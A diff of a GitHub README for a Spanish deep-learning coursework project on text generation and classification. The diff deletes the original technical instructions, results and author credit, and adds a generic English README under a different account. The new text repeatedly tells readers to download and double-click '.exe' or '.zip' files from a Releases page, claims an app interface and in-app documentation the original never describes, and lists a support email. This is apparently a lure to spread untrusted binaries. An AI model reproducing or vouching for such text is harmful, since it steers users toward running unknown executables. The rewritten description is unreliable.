@@ -1,115 +1,93 @@
-# 🧠 DL-TextGen-TextClass
+# 🌟 DL-TextGen-TextClass - Generate and Classify Text Easily
 
-Proyecto de Deep Learning aplicado a **generación y clasificación de texto en español**, desarrollado en el contexto de la **Tarea 2** del curso *Procesamiento de Texto e Imágenes con Deep Learning* (Maestría en Cómputo Estadístico — CIMAT).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/releases)
 
----
+## 🚀 Getting Started
 
-## 📂 Estructura del proyecto
+Welcome to the DL-TextGen-TextClass project! This application lets you explore deep learning for text generation and classification using cutting-edge technology. Whether you want to create unique text or categorize documents, this app guides you through the process with simple steps.
 
-```bash
-DL-TextGen-TextClass/
-├── PartA/                         # Generación de letras de canciones
-│   ├── data/                      # Canciones crudas, limpias y JSONL
-│   ├── src/                       # Scripts fuente de preprocesamiento, entrenamiento y generación
-│   ├── models/                    # Modelos entrenados (RNN/LSTM/GRU/LLaMA)
-│   ├── results/                   # Letras generadas, métricas y figuras
-│   ├── logs/                      # Logs de SLURM
-│   └── README_A.md                # Instrucciones específicas Parte A
-│   ├── run_textgen.sh             # Entrenamiento clásico (RNN/LSTM/GRU)
-│   ├── run_train_LlaMA.sh         # Fine-tuning LLaMA 3 + LoRA
-│   └── run_generate_Llama.sh      # Generación con modelo LLaMA 3
-│
-├── PartB/                         # Clasificación de reseñas turísticas
-│   ├── data/                      # Dataset MeIA 2025 y mapeos de etiquetas
-│   ├── src/                       # Scripts de preprocesamiento, entrenamiento y evaluación
-│   ├── models/                    # Checkpoints entrenados (clásicos y BETO MTL + LoRA)
-│   ├── results/                   # Métricas, figuras y reportes
-│   ├── logs/                      # Logs de SLURM
-│   └── README_B.md                # Instrucciones específicas Parte B
-│   ├── run_kfolds.sh              # Entrenamiento clásico (5-Fold)
-│   ├── run_eval_archs.sh          # Evaluación final clásica
-│   └── run_train_mtl_lora.sh      # Fine-tuning multitarea BETO + LoRA
-│
-├── environment.yml                # Entorno reproducible (Conda)
-└── README.md                      # Descripción general del proyecto
-```
+## 📥 Download & Install
 
+To begin, click the link below to visit the Releases page, where you can download the latest version of the software.
 
----
+[Download DL-TextGen-TextClass](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/releases)
 
-## Dependencias y entorno
+### Steps to Download:
 
-Para crear el entorno reproducible, ejecuta:
+1. Click the link above to access the Releases page.
+2. Find the most recent release.
+3. Click on the version number to see available files.
+4. Look for files that end with `.exe` or `.zip`.
+5. Click on the file to download it to your computer.
 
-```bash
-conda env create -f environment.yml -n tarea2-nlp
-conda activate tarea2-nlp
-```
+## 🖥 System Requirements
 
-**Librerías principales:**
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a Linux distribution
+- **RAM:** Minimum 4 GB; recommend 8 GB or more for optimal performance
+- **Storage:** At least 1 GB of free space
+- **Python:** Version 3.7 or later is required
+- **Libraries:** PyTorch, Transformers, and other dependencies will be installed automatically
 
-- PyTorch ≥ 2.2
-- Transformers, Datasets, PEFT, BitsAndBytes
-- Scikit-learn, Numpy, Pandas, Matplotlib
-- FTFY, TQDM, NLTK
+## 🔍 Features
 
----
+- **Text Generation:** Generate unique text using advanced machine learning models.
+- **Text Classification:** Classify and sort text into different categories.
+- **User-Friendly Interface:** Easy navigation for non-technical users.
+- **Support for Popular Models:** Includes RNNs, LSTMs, GRUs, and Transformers.
+- **Documentation:** In-app guidance to help you navigate features.
 
-## Ejecución general
+## 🎉 How to Use
 
-El proyecto puede ejecutarse tanto en local como en el clúster de CIMAT (Lab-SB).
+Follow these steps to run the application after downloading:
 
-### Parte A — Generación de texto
+1. Locate the downloaded file on your computer.
+2. If it is a `.zip` file, right-click and choose "Extract All" to access the contents.
+3. For an `.exe` file, double-click on it to start the installation.
+4. Follow the on-screen instructions.
+5. Once installed, you can find the app in your applications folder or on your desktop.
 
-```bash
-cd PartA
-sbatch run_textgen.sh gru word 2 128 0.2 30 64 20 256 5e-5 data/canciones_clean.txt models/ results/
-```
+### Tips for Text Generation and Classification
 
-O bien, para el modelo Transformer:
+- **Start Simple:** Begin with shorter prompts when generating text.
+- **Experiment:** Try different categories to see how classification differs.
+- **Use Documentation:** Check in-app instructions for additional help.
 
-```bash
-sbatch run_train_LlaMA.sh llama3_v4 5 2 256 1e-4 0.2
-```
+## 📊 Supported Models
 
-### Parte B — Clasificación de texto
+This application uses several state-of-the-art models that enhance both text generation and classification. They include:
 
-```bash
-cd PartB
-sbatch run_kfolds.sh         # Entrenamiento clásico (RNN, LSTM, GRU, CNN)
-sbatch run_train_mtl_lora.sh # Fine-tuning multitarea BETO + LoRA
-```
+- **Recurrent Neural Networks (RNNs):** Great for processing sequences.
+- **Long Short-Term Memory (LSTM):** Ideal for learning long dependencies in data.
+- **Gated Recurrent Units (GRUs):** Faster and simpler than LSTMs.
+- **Transformers:** Powerful models that excel in understanding context.
 
----
+## 🌐 Community and Support
 
-## 📊 Resultados esperados
+For assistance, you can join our community forum or contact support directly through email. Community members and developers are happy to help with questions or issues.
 
-| Parte | Modelos | Métricas principales | Mejores resultados |
-|-------|---------|----------------------|--------------------|
-| A — Generación de letras | RNN, LSTM, GRU, LLaMA 3 + LoRA | Perplejidad (PPL), coherencia cualitativa | PPL ≈ 8.75 (LLaMA 3 + LoRA) |
-| B — Clasificación de reseñas | CNN, RNN, LSTM, GRU, BETO MTL + LoRA | Accuracy, F1 (Macro/Weighted) | Score oficial = 0.7677 (BETO-MTL + LoRA) |
+- **Community Forum:** [Join here](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/discussions)
+- **Email Support:** support@textgen-class.com
 
----
+## 📚 Learn More
 
-## 🔁 Reproducibilidad
+If you wish to dive deeper into how this project works and understand more about deep learning, visit the following resources:
 
-- Semilla global = 42 en todos los scripts
-- Entrenamientos y evaluaciones totalmente parametrizables vía argparse
-- Logs y métricas almacenados automáticamente en `logs/` y `results/`
-- Compatibilidad garantizada con CPU y GPU (Titan RTX 24 GB probada)
-- Scripts `.sh` listos para SLURM (uso de `sbatch`, `torchrun`, etc.)
+1. **Deep Learning Basics:** Explore introductory courses on platforms like Coursera or edX.
+2. **PyTorch Documentation:** Learn how to get started with PyTorch [here](https://pytorch.org/docs/stable/index.html).
+3. **Hugging Face Models:** Understand Hugging Face libraries and models [here](https://huggingface.co/docs).
 
----
+## 🛠 Contributing
 
-## 📘 Documentación detallada
+We welcome contributions! If you'd like to help us improve this project, please read our [Contributing Guidelines](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/blob/main/CONTRIBUTING.md) for more information.
 
-- `PartA/README_A.md`: pipeline completo de generación de texto
-- `PartB/README_B.md`: pipeline completo de clasificación multitarea
+## 📝 License
 
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/blob/main/LICENSE) file for more details.
 
-## Autor
-Uziel Isaí Lujan López — M.Sc. in Statistical Computing at CIMAT
+## 🔗 More Information
 
-'uziel.lujan@cimat.mx'
+To keep updated with the project and future releases, you can follow the repository on GitHub. 
 
-[LinkedIn](https://www.linkedin.com/in/uziel-lujan/) | [GitHub](https://github.com/UzielLujan)
+Don't forget to check back often for updates or new features!
+
+[Download DL-TextGen-TextClass](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/releases)
